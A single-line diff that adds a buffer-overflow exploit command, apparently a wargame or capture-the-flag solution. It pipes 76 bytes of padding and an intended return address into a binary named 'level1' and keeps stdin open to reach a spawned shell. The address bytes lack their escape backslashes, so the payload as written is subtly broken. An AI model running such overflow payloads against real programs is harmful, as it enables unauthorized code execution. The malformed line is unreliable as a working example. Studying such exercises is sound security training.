@@ -1,0 +1,1 @@
+(printf %.0sA {1..76} ; printf x44x84x04x08 ; cat) | ./level1
